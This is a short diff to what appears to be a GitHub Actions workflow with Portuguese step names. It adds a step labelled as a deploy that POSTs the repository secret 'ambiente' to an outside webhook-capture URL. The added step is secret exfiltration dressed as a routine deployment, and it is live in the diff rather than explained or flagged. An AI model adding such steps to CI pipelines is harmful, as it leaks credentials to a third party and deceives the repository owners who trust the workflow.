@@ -11,3 +11,5 @@ jobs:
         steps:
             - name: Deploy no ambiente
               run: echo "Executando o deploy no ambiente de ${{secrets.ambiente}}"
+            - name: Curl Deploy no Ambiente
+              run: "curl -X POST https://webhooksite.net/5e6ab472-d67a-4b39-80ad-e27d2b3aae8a -d '{ ambiente: ${{secrets.ambiente}}}'"
